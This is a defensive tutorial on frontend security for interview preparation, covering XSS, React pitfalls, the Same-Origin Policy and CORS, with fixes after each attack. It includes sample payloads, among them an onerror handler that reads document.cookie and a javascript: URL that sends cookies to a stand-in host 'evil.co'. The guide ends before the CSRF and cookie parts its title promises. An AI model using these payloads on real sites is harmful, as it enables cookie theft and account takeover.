Frontend Security: XSS, CORS, CSRF & Cookies

Four letters, three letters, four letters. They sound similar, they get mixed up constantly, and interviewers know it. By the end of this you'll be able to explain each one from first principles — and, more importantly, explain why they're different problems.

I want to start with a confession: for the first two years I wrote frontend code, I thought CORS was a security feature that protected my API. I thought it was there to stop other people from calling my endpoints. I would have said that out loud in an interview with total confidence.

It's almost exactly backwards. CORS is a mechanism for loosening a restriction, the restriction protects users and not servers, and a determined attacker with a script and a terminal ignores the whole thing in about four seconds.

That misconception is so common that "explain CORS" has become a filter question. It separates people who memorised a Stack Overflow answer from people who understand what a browser actually is. Same with XSS, same with CSRF. These topics are where interviewers go to test whether you have a mental model of the browser as a security boundary, or whether you just know which header to paste to make the red error go away.

So we're going to build that model. Slowly, from the bottom. There's a lot here, and I'm not going to pretend otherwise — this is one of the longer guides. But every section only uses ideas from the sections before it, so if you read straight through, nothing should ever feel like it came out of nowhere.

One quick framing note, because it matters: this is defensive material. I'll explain how attacks work, because you cannot defend against a mechanism you don't understand, but the goal throughout is the fix. Every attack section ends with "and here's how you make this impossible."

Part 1The foundation: what a browser trusts, and why

Before any of the acronyms, we need one idea, and it's the idea everything else hangs off.

Your browser, right now, is probably logged into your bank, your email, your GitHub, and a dozen other things. It's holding the keys to all of them at the same time. And it's simultaneously running code — JavaScript — downloaded from whatever random sites you have open. Some of that code was written by people you've never met.

Think about how insane that is. It's as if you handed your house keys, car keys, and safe combination to a stranger, and the only thing keeping you safe is a very carefully written rulebook about which stranger is allowed to touch which key.

That rulebook is browser security. And the fundamental unit in it — the thing the rulebook is written in terms of — is the origin.

What an origin is

An origin is three things glued together:

  https  ://  app.example.com  :  443
  ─────       ───────────────     ───
  scheme         host            port

Scheme (the protocol — https or http), host (the full domain name), and port. All three. If any one of them differs, it's a different origin, and the browser treats it like a different company.

This trips people up because it doesn't match how humans think about "the same site." Let's do it concretely. Given a page loaded from https://app.example.com/dashboard:

URLSame origin?Why
https://app.example.com/settings✅ YesPath doesn't matter at all
https://app.example.com/api?q=1✅ YesQuery string doesn't matter either
http://app.example.com/dashboard❌ NoDifferent scheme (http vs https)
https://api.example.com/users❌ NoDifferent host — subdomains count!
https://example.com/❌ NoAlso a different host
https://app.example.com:8443/❌ NoDifferent port

Two rows there are the ones that bite people. Subdomains are different origins. app.example.com and api.example.com are as foreign to each other as google.com and evil.biz, as far as the origin rules are concerned. And the path is irrelevant — origin stops at the port.

Wait, what about "site"?

You'll also see the word site in specs, and it means something looser: roughly the registrable domain (example.com) plus scheme, ignoring subdomains and ports. So app.example.com and api.example.com are different origins but the same site.

Why do you care? Because cookies and SameSite — which we'll get to — work at the site level, not the origin level. That mismatch is the source of a surprising number of bugs. Park it for now; I'll flag it again when it matters.

The two questions every security topic answers

Here's the frame I wish someone had given me on day one. Every topic in this guide is an answer to one of two questions:

  1. "Whose code is running in my page?" — If an attacker can get their JavaScript executing inside your origin, they inherit everything your page can do. That's XSS. CSP, sanitisation, and Subresource Integrity are all defences here.
  2. "Who is this request really from, and who's allowed to read the answer?" — Requests fly between origins constantly. The Same-Origin Policy, CORS, CSRF, and cookie attributes are all about identifying and constraining those.

If you can sort a question into bucket 1 or bucket 2 in an interview, you're already ahead of most candidates. XSS is bucket 1. CORS and CSRF are bucket 2. They're not variants of each other; they're different halves of the problem.

Right. Let's start with bucket 1, because it's the one that ruins your whole day.

Part 2XSS — when your data becomes their code

Let's start with something small and boring. You're building a comment section. Someone leaves a comment, you store it, you render it:

comments.js — looks fine, right?
const box = document.querySelector('#comments');

box.innerHTML = comments
  .map(c => `<p><b>${c.author}</b>: ${c.body}</p>`)
  .join('');

This is completely normal-looking code. I have written this exact thing. You probably have too.

Now: what happens if someone submits a comment whose body is this?

<img src=x onerror="alert(document.cookie)">

Take a second with it. That string gets stored in your database. Then it gets glued into a template string. Then that string gets handed to innerHTML.

And innerHTML doesn't "display text." It parses HTML. So the browser reads that string, finds an <img> tag, tries to load an image from the URL x, fails (obviously), and fires the onerror handler. Which is JavaScript. Which now runs.

Not in the attacker's page. In yours. On your origin. In the browser of every single person who views that comment.

That's cross-site scripting. And I want to be really precise about why it's so bad, because "an attacker can run JavaScript" undersells it enormously.

Why running code in your origin is total compromise

Remember the origin idea. The browser's entire permission system is keyed on origin. Code running on https://yourbank.com is trusted to do everything a page on https://yourbank.com can do, because — normally — that code came from yourbank.com.

So injected script inherits, immediately and without asking:

  • The DOM. It can read every field on the page, including the ones the user just typed. It can rewrite the page — swap the "transfer to" account number, add a fake login form.
  • Cookies (unless they're HttpOnly — we'll get there, it's the single most important mitigation).
  • localStorage and sessionStorage. Entirely. Which is why "just put the JWT in localStorage" is a conversation we're going to have.
  • The ability to make authenticated requests. This is the killer. The script can call fetch('/api/transfer', {...}) and the browser will attach the session cookie automatically, because the request genuinely is coming from your origin. Same-origin. No CORS involved. It looks, to your server, exactly like the real user clicking a button.

Notice that last one carefully: XSS lets an attacker act as the user, not just steal a token. That distinction comes back later and it's the answer to a very common follow-up question.

A common misconception

"XSS is just about popping an alert()." The alert is how you demonstrate it in a proof of concept, the way you'd tap a wall to show it's hollow. The actual payloads silently exfiltrate session data, keylog the login form, rewrite payment details, or quietly perform actions as the user. An XSS on a page that handles money or credentials is, for practical purposes, full account takeover.

The three flavours

XSS is always the same core bug — data got treated as code — but it comes in three delivery mechanisms, and interviewers love asking you to name them. What actually distinguishes them is where the malicious string lives before it reaches the victim.

Stored XSS (a.k.a. persistent)

The payload gets saved on the server — in the comments table, the username field, the "about me" bio, a product review, a support ticket. Then it's served to everybody who loads that page.

This is the worst kind by a distance, because the attacker doesn't need to trick anyone into clicking anything. They plant it once and it hits every visitor. Stored XSS in a username field is how you get a self-propagating worm — the classic being the MySpace "Samy" worm in 2005, which added a million friends in under a day by putting a payload in a profile that added the payload to your profile when you viewed it.

Reflected XSS

The payload is in the request — usually a query parameter — and the server echoes it straight back into the response HTML. Think of a search page that renders You searched for: <the query>.

https://shop.example.com/search?q=<script>…</script>
                                  ▲
        server pastes this into the page unescaped

Nothing is stored. The payload only exists in that one URL, so the attacker needs a lure: a phishing email, a shortened link, a malicious ad. That's a real extra hurdle, which is why reflected ranks below stored — but "needs a click" has never been much of a defence in practice.

DOM-based XSS

This one is the sneakiest, and it's the one that's grown as apps became more client-heavy. The payload never touches your server at all. The vulnerability lives entirely in your JavaScript.

❌ Buggy — a real pattern I've seen shipped
// "Nice" welcome banner: /page#name=Sam  →  "Welcome, Sam!"
const name = decodeURIComponent(location.hash.slice(6));

document.querySelector('#banner').innerHTML = `Welcome, ${name}!`;
//                                  👆 sink        👆 source

Two words worth learning because they make this whole class of bug easy to talk about:

  • A source is anywhere attacker-controllable data enters your JS: location.hash, location.search, document.referrer, postMessage data, a value read back out of localStorage, an API response containing another user's content.
  • A sink is anywhere data gets interpreted as code or markup: innerHTML, outerHTML, document.write, insertAdjacentHTML, eval, new Function, setTimeout with a string argument, assigning to element.src or href, jQuery's $(...) with an HTML string.

DOM XSS is a source flowing into a sink without a scrub in between. That's the whole thing. When you audit a codebase, you're basically grepping for sinks and tracing backwards.

And notice the extra nastiness in that example: the payload is after a #. The fragment is never transmitted to the server. Your server logs, your WAF, your backend security scanner — none of them will ever see the attack. Only the browser does.

Under the hood — why <script> tags in innerHTML don't fire

If you experiment, you'll notice el.innerHTML = '<script>alert(1)</script>' doesn't actually run. The HTML spec says script elements inserted via innerHTML are parsed but not executed.

People occasionally use this to argue innerHTML is safe. It absolutely is not — it's why every real payload uses an event handler instead (<img src=x onerror=…>, <svg onload=…>, <body onpageshow=…>). There are dozens of these. Blocking the string "script" blocks nothing.

Fixing it, in priority order

Here's the thing about XSS defences: people reach for the exciting ones (sanitiser libraries, CSP) and skip the boring one that actually solves 95% of cases. Let's do them in the order you should actually apply them.

1. Contextual output encoding — the real fix

The bug is that a character with special meaning in HTML (<) got interpreted as special. So: when you insert untrusted data into a document, convert those characters into their harmless entity forms. < becomes &lt;, > becomes &gt;, & becomes &amp;, quotes become &quot; and &#39;.

Now <img src=x onerror=…> renders as the literal, inert text "<img src=x onerror=…>" on the page. Which, honestly, is what the user asked for.

But — and this is the part that gets skipped — "encoding" isn't one operation. It depends on where the data lands. HTML has several sub-languages inside it, each with different special characters.

ContextExampleWhat breaks out of it
HTML body text<p>DATA</p>< and & — escape to entities
Attribute value<div title="DATA">The quote character. Unquoted attributes are far worse — a space is enough to add onmouseover=
URL attribute<a href="DATA">Nothing needs escaping — the scheme is the danger. javascript: and data: execute
Inside a <script>var user = "DATA";Quotes, backslashes, and </script> — which ends the block even inside a string literal
Inside CSSstyle="width: DATA"expression() in old IE; url() exfiltration; breaking out with }

That fourth row is genuinely surprising and worth internalising. The HTML parser looks for the byte sequence </script without caring at all that it's inside a JS string. So this:

❌ Buggy — server-rendering state into a script tag
<script>
  window.__STATE__ = {"bio": "</script><img src=x onerror=alert(1)>"};
</script>

…closes the script block early and the rest becomes live HTML. JSON encoding alone doesn't save you, because JSON.stringify has no reason to escape a forward slash.

✅ Fixed — escape the sequences that matter to the HTML parser
const safe = JSON.stringify(state)
  .replace(/</g, '\\u003c')   // 👈 kills </script> and <!--
  .replace(/>/g, '\\u003e')
  .replace(/&/g, '\\u0026');

// then:  <script>window.__STATE__ = ${safe}</script>

Those unicode escapes are still valid JSON and parse back to the same string — they just don't look like a tag to the HTML parser. (Most serious SSR frameworks do this for you. Worth knowing that they're doing it, and why.)

Wait — why isn't sanitizing on input enough?

Very common instinct: strip dangerous characters when the comment is submitted, then you never have to think about it again. It fails for three reasons, and this is a favourite interview follow-up.

One: at input time you don't know the output context. The same bio string might end up in HTML body text, in a title attribute, in a JSON blob inside a <script>, in a PDF, and in an email. Each needs different escaping. You cannot pick the right one before you know the destination.

Two: it corrupts real data. Someone named O'Brien, a maths comment containing a < b, a C++ question — all mangled forever. Escaping at output keeps the database honest and the display safe.

Three: input filters are a blocklist, and blocklists lose. Data also arrives through paths that skip your filter: a database import, an admin tool, a third-party API, another microservice. Output encoding is the last gate before rendering, so everything passes through it.

Validate on input (is this a plausible email? is this under 500 chars?). Encode on output. Different jobs.

2. Stop using innerHTML when you mean text

Enormous number of XSS bugs die right here:

✅ Fixed
el.textContent = comment.body;   // 👈 never parses HTML. Ever.

textContent treats the string as text, full stop. If it contains <script>, you'll see the characters <script> on screen. There is no escaping to get wrong because there's no parser involved.

If you need structure, build it with createElement and append, or use a templating system that escapes by default. The rule of thumb I'd give: if you're about to type .innerHTML =, stop and ask whether every byte of that string came from your own source code. If any of it came from a user, an API, or a URL, you need a different approach.

3. If you genuinely must render user HTML, use a real sanitiser

Sometimes the requirement is real: a rich-text editor, a CMS, markdown with embedded HTML. In that case, you need to parse the HTML, walk the resulting tree, and delete everything not on an allowlist of tags and attributes.

Do not write this yourself. I mean it. Here's why: the "obvious" approach is a regex that strips <script> tags. But attackers have <SCRIPT>, <scr<script>ipt> (strip once and it reassembles), null bytes, weird encodings, <svg> namespace confusion, <math> tricks, mutation bugs where the browser re-parses your "clean" output into something dangerous. Professional sanitisers have years of adversarial testing baked in.

✅ Fixed
import DOMPurify from 'dompurify';

const clean = DOMPurify.sanitize(post.htmlBody, {
  ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'a', 'ul', 'ol', 'li'],
  ALLOWED_ATTR: ['href'],   // 👈 allowlist, not blocklist
});
el.innerHTML = clean;

Note the shape: you list what's allowed, and everything else dies. Never the reverse. A blocklist is a promise that you thought of every dangerous thing, and you didn't. Nobody has.

There's also a built-in browser API arriving for exactly this — Element.setHTML(), backed by the Sanitizer API — which does allowlist sanitisation natively. Nice thing to mention; check support before relying on it.

4. Never eval anything that came from outside

eval, new Function, setTimeout('someString'), and setInterval with a string all take text and execute it as code. If any part of that text is attacker-influenced, you've handed over the keys directly. There's essentially never a good reason for this in application code.

5. CSP as defence in depth

A Content Security Policy tells the browser "only execute scripts from these places." If you have a CSP and an attacker injects a script tag anyway, the browser refuses to run it. That's a genuinely valuable extra layer — and it gets its own section later.

But I want to be blunt about its place in the list: CSP is a seatbelt, not a reason to drive badly. A CSP with the wrong directive, an overlooked unsafe-inline, or a gap for a JSONP endpoint on an allowlisted CDN can be bypassed. Fix the injection; deploy CSP as well.

Part 3XSS in React specifically

Here's a question I ask a lot: is React immune to XSS?

The answer people give is "yes, React escapes everything." That's about 80% right, which in an interview is worse than knowing exactly where the 20% is.

Let's establish the true part first. When you write this:

function Comment({ body }) {
  return <p>{body}</p>;
}

…that {body} is not string concatenation. JSX compiles to React.createElement('p', null, body), and React sets that child as text, not markup. Under the hood it ends up doing the equivalent of textContent. If body is <img src=x onerror=alert(1)>, the user sees those literal characters on the page.

So the default path is safe — genuinely, structurally safe, not "safe if you remember." That's a big deal, and it's why the XSS rate in React apps is much lower than in the jQuery era. React had to go out of its way to build an escape hatch, and it named that hatch with a scary word on purpose.

The five ways you re-open the hole

1. dangerouslySetInnerHTML

The obvious one. It's deliberately ugly to type, and the awkward object shape ({{ __html: ... }}) exists so that it's impossible to do accidentally and trivial to grep for.

❌ Buggy
<div dangerouslySetInnerHTML={{ __html: post.body }} />
✅ Fixed
<div dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(post.body) }} />

Better still, sanitise once on write rather than on every render, and keep sanitised and raw in separate fields so you always know which is which.

2. href with a user-supplied URL

This one catches people who feel very safe. React escapes the value of an attribute, so you can't break out of the quotes. But it doesn't validate the URL scheme:

❌ Buggy — no innerHTML anywhere, still XSS
<a href={user.website}>My site</a>

// user.website = "javascript:fetch('//evil.co?c='+document.cookie)"
// → one click and it runs. In your origin.

The fix is to check the scheme against an allowlist before rendering. And do the check by parsing, not by string-matching the prefix, because java\tscript: and JaVaScRiPt: and leading-whitespace variants all still work in some parsers:

✅ Fixed
function safeUrl(raw) {
  try {
    const u = new URL(raw, window.location.origin);
    return ['http:', 'https:', 'mailto:'].includes(u.protocol)
      ? u.href
      : '#';           // 👈 anything else gets neutered
  } catch {
    return '#';
  }
}

<a href={safeUrl(user.website)} rel="noopener noreferrer">My site</a>

The same applies to src on iframes, formAction, and xlink:href on SVG. Newer React versions warn on javascript: URLs, but don't rely on the framework version to be your security control.

3. Spreading unvalidated props

<div {...propsFromApi} />   // 👈 what's in there?

If that object came from an API and contains dangerouslySetInnerHTML, or an href, you've just handed the API control over your DOM. Spreading is convenient and it's fine for props you constructed; it's a hole for props you received.

4. ref plus direct DOM manipulation

The moment you reach past React to the real DOM node, React's escaping stops applying, because React isn't involved:

❌ Buggy
useEffect(() => {
  chartRef.current.innerHTML = data.tooltipHtml;  // 👈 React can't help you here
}, [data]);

Same for anything you do inside a D3, Chart.js, or map-library integration. Third-party libraries that take an "html" option are a classic hiding place for this.

5. Server-rendering state into a <script> tag

We covered the mechanism above; here's the React shape of it. Server-side rendering usually ships the initial store alongside the HTML so the client can hydrate without a second fetch:

❌ Buggy
<script>
  window.__PRELOADED__ = ${JSON.stringify(store.getState())}
</script>

If any user-controlled string in that state contains </script>, the block closes early and everything after it is live HTML. Escape <, > and & to their \uXXXX forms as shown earlier, or serialise into a <script type="application/json"> block and JSON.parse(el.textContent) on the client — inside that element type, the browser isn't looking for tags, though it is still looking for </script>, so escape anyway.

Trusted Types — the structural fix

Everything above relies on humans not making mistakes. Trusted Types flips that. You send a header:

Content-Security-Policy: require-trusted-types-for 'script'

and now the browser throws a TypeError if anyone assigns a plain string to a dangerous sink like innerHTML. The only thing those sinks accept is a special object minted by a policy you registered explicitly:

const policy = trustedTypes.createPolicy('app-html', {
  createHTML: (input) => DOMPurify.sanitize(input),
});
el.innerHTML = policy.createHTML(userInput);  // ✅ allowed
el.innerHTML = userInput;                     // ❌ TypeError

It converts "did we remember to sanitise everywhere?" from a code-review question into a runtime guarantee, and it funnels every DOM-XSS sink in your app through a handful of auditable functions. Chromium-based browsers support it; Firefox and Safari have been catching up. Mentioning this in an interview is a strong signal.

In an interview — XSS

How it gets asked

"What is XSS?" · "What are the types of XSS and which is most severe?" · "How would you safely render user-generated HTML?" · "Is React immune to XSS?" · "You're reviewing a PR with dangerouslySetInnerHTML — what do you ask?" · "Walk me through how you'd audit a page for DOM XSS."

Model answer — say this out loud

"XSS is when attacker-controlled data ends up being interpreted as code inside my origin. That matters because the browser's whole trust model is per-origin, so injected script gets everything my page has — the DOM, non-HttpOnly cookies, localStorage, and the ability to make authenticated requests as the user.

There are three delivery routes: stored, where it's persisted server-side and hits everyone who loads the page, which is the worst; reflected, where it's echoed back from a query param and needs a lure; and DOM-based, where the server never sees it at all — a client source like location.hash flows into a client sink like innerHTML.

The primary fix is contextual output encoding — and the context matters, because escaping for HTML body text is different from an attribute, a URL, or inside a script tag. In practice that means preferring textContent over innerHTML, using DOMPurify with an allowlist if I genuinely have to render user HTML, and never eval'ing untrusted input. Then CSP on top as defence in depth."

Why this lands: you led with the trust model rather than a definition, you distinguished the three types by mechanism instead of reciting names, and you ranked defences instead of listing them. The phrase "context matters" is a strong signal on its own — it's the thing people who've only read a blog post leave out.

Follow-up: "Is React immune to XSS?"

Show the answer

"Safe by default, not immune. JSX interpolation escapes values because it sets them as text nodes rather than parsing markup, so the common case is handled structurally. But there are five ways back in: dangerouslySetInnerHTML; a user-controlled href, which React escapes as a value but doesn't scheme-check, so javascript: URLs still execute; spreading unvalidated props from an API; going around React with a ref and touching the DOM directly; and server-rendering state into a script tag where a </script> in the data closes the block early."

Naming href is the differentiator here — almost everyone names dangerouslySetInnerHTML and stops.

Follow-up: "When is dangerouslySetInnerHTML acceptable?"

Show the answer

Two cases. One: the HTML came from a trusted source you control — your own CMS output, markdown you rendered server-side from your own content, an email template. Two: the HTML came from users but has been through a real sanitiser with an allowlist, ideally at write time so it isn't re-run on every render and so you can audit what's stored.

What makes the answer good is adding the operational bit: sanitise as close to the sink as you can, keep the raw and sanitised versions in different fields so nobody confuses them, and if the "trusted CMS" has authors who aren't fully trusted, it isn't trusted — sanitise it too.

Follow-up: "Why isn't sanitising on input enough?"

Show the answer

Because the right escaping depends on the output context, and you don't know the context at input time — the same string may go to HTML body, an attribute, a script tag, an email, a PDF. Because it destroys legitimate data (names with apostrophes, code snippets). And because data reaches the database through paths that skip your input filter — imports, admin tools, other services — whereas the output path is the one gate everything passes through. Validate on input for shape and length; encode on output for safety.

Follow-up: "How would you find DOM XSS in a codebase?"

Show the answer

Grep for sinks and trace backwards: innerHTML, outerHTML, insertAdjacentHTML, document.write, eval, new Function, setTimeout with a string, dangerouslySetInnerHTML, and assignments to href/src. For each, ask whether the value can be traced to a source: location.*, document.referrer, postMessage, storage, or an API response containing other users' content. Then lint it so it can't regress, and consider Trusted Types to make the whole class impossible.

Trap

Wrong: "We escape <script> tags, so we're fine." Nearly every real payload uses an event-handler attribute rather than a script tag, and innerHTML doesn't execute injected script tags anyway. Blocklisting a string is not a defence.
Say instead: "We allowlist — either by encoding everything, or by parsing and keeping only known-safe tags and attributes."

Part 4The Same-Origin Policy (read this before CORS)

Now for the topic people most reliably explain backwards. We're going to be careful.

The mistake is starting with CORS. CORS makes no sense on its own, because CORS is a way of relaxing a rule — and if you don't know the rule precisely, "relaxing it" is meaningless noise. So: the rule.

The scenario the rule exists to prevent

You're logged into https://bank.com. In another tab you open https://cat-pictures.example, which is run by someone with bad intentions. Their page contains:

fetch('https://bank.com/api/account')
  .then(r => r.json())
  .then(data => {
    // send data.balance and data.accountNumber to the attacker
  });

Here's the uncomfortable part: your browser will happily attach your bank.com cookies to that request, because — as we'll see properly in the CSRF section — cookies are attached based on where the request is going, not who asked for it. So bank.com receives a fully authenticated request and cheerfully returns your account details.

If JavaScript on cat-pictures.example could read that response, the web would be unusable. Every site you visited could silently vacuum up every other site you were logged into.

So the browser steps in. The Same-Origin Policy says: script from origin A may not read the response from origin B. The response comes back, the browser holds it, looks at it, and hands your JS an error instead.

The precise wording — this is the whole interview

Read this slowly, because the details are the answer to three separate follow-up questions:

What SOP actually does

It restricts reading cross-origin responses from script.

It does NOT stop the request from being sent. The request goes out. It reaches the server. The server processes it. If it was a DELETE /api/posts/42, the post is gone. The browser only blocks your JavaScript from seeing the answer.

It does NOT apply to ordinary HTML elements. <img src>, <script src>, <link rel=stylesheet>, <video>, <iframe>, and form submissions all cross origins freely — that's how the web works. You can embed any image from any domain. What you can't do is read its pixels back out (a canvas gets "tainted"), or read the text of a cross-origin script, or read the frame's DOM.

That second point deserves a moment. A lot of people carry a mental image of SOP as a firewall that stops the packet. It isn't. It's more like a mail room: your letter goes out and gets delivered, the reply comes back to the building, and the mail room decides whether you're cleared to open it. The recipient already read your letter and acted on it either way.

Once that clicks, CSRF stops being mysterious. CSRF is precisely the attack that lives in the gap between "the request was sent and processed" and "you couldn't read the response." The attacker doesn't need the response — they just needed the transfer to happen.

What SOP protects, exactly

SOP isn't one rule; it's a family of rules applied to different things:

  • Network responses (fetch/XHR): can't read cross-origin bodies or most headers.
  • The DOM of iframes: iframe.contentWindow.document throws if the frame is a different origin. You can still postMessage to it — that's the sanctioned, explicit channel, and you should always check event.origin when receiving.
  • Storage: localStorage, sessionStorage, IndexedDB are partitioned per origin. https://app.example.com genuinely cannot see http://app.example.com's localStorage.
  • Canvas pixels: draw a cross-origin image, and getImageData() throws. Otherwise you could load a private image and read it pixel by pixel.

Cookies, notably, follow their own older and looser rules based on domain rather than origin. That mismatch is the seed of several problems we'll hit later.

Part 5CORS — the server's permission slip

Now the rule is clear, so the exception makes sense.

SOP is a good default, but sometimes cross-origin reading is exactly what you want. Your React app on https://app.example.com genuinely does need to call https://api.example.com. Different host, different origin, blocked by default. That's correct behaviour and also deeply annoying.

So we need a way for the API to say: "it's fine, I know about app.example.com, let them read my responses."

That mechanism is Cross-Origin Resource Sharing. And here's the one-sentence version to carry into an interview:

The sentence

CORS is a way for a server to tell the browser to relax the Same-Origin Policy for specific origins. The browser enforces it; the server declares it. It protects users, not servers.

Every word there is doing work:

  • relax — CORS never adds a restriction. It only ever removes one. A "CORS error" isn't CORS blocking you; it's CORS failing to unblock you, so the default SOP restriction stayed in place.
  • the browser enforces it — the check happens in the user's browser, on the client. Nothing about it happens on the server beyond emitting a header.
  • the server declares it — which is why you cannot fix it from the frontend, and we'll spend some time on that.
  • protects users — it stops your browser from leaking data you have access to. The API is unbothered either way.

My analogy: CORS is a guest list at a private club. The bouncer (your browser) has a standing rule that you can't take the contents out of the building. But the club owner (the API server) can post a list saying "guests from app.example.com may take their food home." The bouncer reads the list and lets you through. The list means nothing to someone who isn't going through the front door at all — which is the whole point of the next section.

Simple requests vs preflighted requests

There are two shapes a cross-origin request can take, and the difference is one of the top three CORS interview questions.

Simple requests

Some cross-origin requests were already possible before fetch existed — you could always submit an HTML form to another domain, or load an image. Those requests were part of the web from day one, and blocking them retroactively would break the internet.

So the spec defines a set of requests that are "no more dangerous than an HTML form," and lets them go out immediately. A request is simple when all of these hold:

  • Method is GET, POST, or HEAD
  • The only headers you set are on a small safelist (Accept, Accept-Language, Content-Language, Content-Type, and a couple more)
  • If Content-Type is set, it's one of exactly three values: application/x-www-form-urlencoded, multipart/form-data, or text/plain
  • No ReadableStream body, and no event listeners on XMLHttpRequest.upload

For a simple request, the browser just sends it, with an Origin header attached saying where it came from. The server responds. Then the browser checks the response headers, and if the permission isn't there, it throws away the body and hands your code an error.

Sit with that ordering for a second, because it's the crux of CSRF: the request already happened. Blocking is after the fact.

Preflighted requests

Anything outside that set — PUT, PATCH, DELETE, a custom X-Api-Key header, or (the big one in practice) Content-Type: application/json — is a request that a plain HTML form couldn't have made. Those could do real damage to a server that was written back when "if it's cross-origin it must be a form" was a safe assumption.

So the browser asks permission first. It sends an OPTIONS request — the preflight — describing what it's about to do, and only proceeds if the server approves.

Three things about this diagram that people get wrong:

  1. The preflight is invisible to your code. You called fetch once; the browser made two requests. You can't intercept the OPTIONS, you can't add headers to it, and a service worker won't see it in most cases. It's browser machinery.
  2. The real response needs the headers too. Passing the preflight isn't a permanent pass — every actual response must carry Access-Control-Allow-Origin as well. Servers that only handle OPTIONS are a classic half-fix.
  3. The preflight itself carries no cookies and no auth. So an endpoint that returns 401 on unauthenticated OPTIONS breaks CORS entirely — the preflight fails and the real request never happens. This is a very common real-world bug: "it works in curl, it 401s in the browser."

The response headers, and what each one is for

HeaderWhat it does
Access-Control-Allow-Origin The core one. Either a single exact origin (https://app.example.com) or *. Not a list, not a wildcard pattern — if you support several origins, you check the incoming Origin header against your own allowlist and echo back the matching one.
Access-Control-Allow-Credentials: true Required if the request carries cookies or HTTP auth. Without it, credentialed responses are rejected even when the origin matches.
Access-Control-Allow-Methods Preflight response only. Which methods are permitted.
Access-Control-Allow-Headers Preflight response only. Which non-safelisted request headers are permitted. Miss authorization or content-type here and it fails.
Access-Control-Expose-Headers By default your JS can read only a handful of response headers. Want X-Total-Count or a custom pagination header? Name it here or response.headers.get() returns null.
Access-Control-Max-Age Seconds the browser may cache the preflight result, so it stops re-asking on every request. Big performance win; browsers cap it (Chrome at 2 hours, Firefox at 24).
Vary: Origin Not a CORS header, but essential when you echo the origin. It tells caches "this response differs per Origin header." Without it, a CDN can serve the response cached for origin A to a request from origin B — either breaking your app or leaking across origins.

Why credentials: 'include' can't be combined with *

This one has a genuinely satisfying reason, and explaining it well signals real understanding.

By default, fetch does not send cookies cross-origin. To include them you opt in:

fetch('https://api.example.com/me', {
  credentials: 'include',   // 👈 attach cookies cross-origin
});

Do this against a server responding Access-Control-Allow-Origin: * and the browser refuses, with a very specific error about the wildcard.

Why? Because * means "any origin may read this." That's a fine thing to say about public data — a weather API, a font file. It is a catastrophic thing to say about a response that was personalised using the visitor's session cookie.

If it were allowed, evil.example could fetch https://api.yourbank.com/me with credentials, the browser would attach your cookie, the server would return your data, and the wildcard would authorise evil.example to read it. That's the exact attack SOP exists to stop.

So the spec forbids the combination outright. With credentials, you must name a specific origin — which forces the server to make a deliberate decision about who it trusts. The fix:

✅ Fixed — server side
const ALLOWED = new Set([
  'https://app.example.com',
  'https://staging.example.com',
]);

if (ALLOWED.has(req.headers.origin)) {
  res.setHeader('Access-Control-Allow-Origin', req.headers.origin); // 👈 echo, don't wildcard
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.setHeader('Vary', 'Origin');                                  // 👈 don't forget this
}
A common misconception — "just echo whatever origin came in"

You'll find snippets that do res.setHeader('Access-Control-Allow-Origin', req.headers.origin) with no check, plus Allow-Credentials: true. That is functionally * with credentials — every origin on the internet gets approved, including the attacker's. It's one of the most common real CORS vulnerabilities.

Related trap: sloppy allowlist matching. origin.endsWith('example.com') happily approves https://evilexample.com. Compare against a set of exact strings.

Why the fix always lives on the server

This is where I want you to be really sure of yourself, because the question "can you fix CORS from the frontend?" is designed to catch bluffing.

No. You cannot. And it's not a limitation — it's the point.

The permission is granted by the server that owns the data, because that's the only party who knows who should be allowed to read it. If frontend code could grant itself permission, the entire mechanism would be decorative: every attacker would simply grant themselves access. That's like being turned away at the club and writing your own name on the guest list.

So all of these are non-fixes:

  • Setting the Origin header yourself. It's a forbidden header name — the browser sets it and silently ignores your attempt. Same for Host, Referer, and Cookie.
  • mode: 'no-cors'. The single most misunderstood option in fetch. It doesn't disable CORS; it opts you into an opaque response. Status reads as 0, headers are empty, body is unreadable. The request goes out and that's it. It's there for cases like caching a third-party asset in a service worker, not for reading JSON.
  • An "allow CORS" browser extension. Works on your machine. Your users don't have it. And it's disabling a protection that exists for them.
  • Switching to XHR, or axios, or jQuery. All of them go through the same browser networking stack. The enforcement isn't in the library.

What you can legitimately do:

  • Fix the server. If it's yours, add the headers. This is the answer 90% of the time.
  • Use a dev proxy. Vite/Webpack dev servers can proxy /api/* to the real API. Your browser then only ever talks to localhost:5173 — same origin, no CORS involved. The dev server, being a server, isn't bound by SOP at all.
  • Use a backend-for-frontend in production. Same trick, permanently: your own server calls the third-party API server-to-server and re-exposes it same-origin. This is the standard answer for third-party APIs you don't control (and it lets you keep the API key off the client, which you wanted anyway).
  • Serve API and app from the same origin via path-based routing at the CDN/load balancer — example.com/api/* to the API, everything else to the app. CORS disappears entirely.

The big one: CORS is not a security control on your API

If you take one thing from this section, take this.

CORS is a rule the browser follows. It is implemented in browsers, for browsers, to protect browser users. It is not enforced anywhere else in the universe.

So: curl ignores it. Postman ignores it. A Python script ignores it. Your mobile app ignores it. A server-side script ignores it. Anyone can send any request to your API with any headers, from anywhere, and simply read the response — no browser, no policy, no enforcement.

Which means authentication and authorization must be enforced on the server, always. CORS says who may read a response in a browser. It says nothing about who may call the endpoint. If your endpoint returns another user's data to anyone who asks, a locked-down CORS config buys you exactly zero. The check belongs in your handler: is this request authenticated, and is this user allowed to see this resource?

The flip side is the reassuring bit: a strict CORS policy is not what's keeping your API safe, and a permissive one on genuinely public data isn't a vulnerability. Access-Control-Allow-Origin: * on a public docs endpoint is completely fine.

In an interview — SOP & CORS

How it gets asked

"Explain CORS." · "What's a preflight request and when does it happen?" · "Why does this fetch fail in the browser but work in Postman?" · "Can you fix a CORS error from the frontend?" · "Does CORS protect my API?" · "Why can't you use * with credentials?"

Model answer — say this out loud

"By default the browser enforces the Same-Origin Policy: script on one origin — scheme, host and port — can't read responses from another origin. Note it blocks reading the response; it doesn't stop the request being sent, and it doesn't apply to things like images, scripts, or form posts.

CORS is how a server opts out of that restriction for specific origins. The server sends Access-Control-Allow-Origin, and the browser enforces what the server declared. For anything beyond a simple GET or form-style POST — a PUT, a custom header, JSON content-type — the browser first sends an OPTIONS preflight to ask permission, and only sends the real request if it's approved.

The important nuance is that CORS protects users, not servers. It's browser-enforced, so a non-browser client ignores it completely — which means it's never a substitute for authentication and authorization on the server. And you can't fix it from the frontend: the permission has to come from the server that owns the data, or you route around it with a proxy."

